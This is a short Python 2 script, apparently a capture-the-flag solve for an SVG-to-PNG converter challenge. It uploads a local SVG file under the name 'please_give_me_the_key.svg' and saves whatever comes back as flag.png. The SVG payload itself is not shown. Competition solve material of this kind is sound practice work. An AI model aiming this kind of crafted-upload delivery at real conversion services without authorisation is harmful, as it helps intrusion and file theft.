import requests

url = "http://svgtopng.uni.hctf.fun/"
svg = "small.svg"
files = {'file': ('please_give_me_the_key.svg', open(svg,'rb')) }

response = requests.post(url, files=files)
print response

response_file = response._content
if len(response_file) < 100:
    print response_file
else:
    with open('flag.png', 'wb') as new_file:
        new_file.write(response_file)
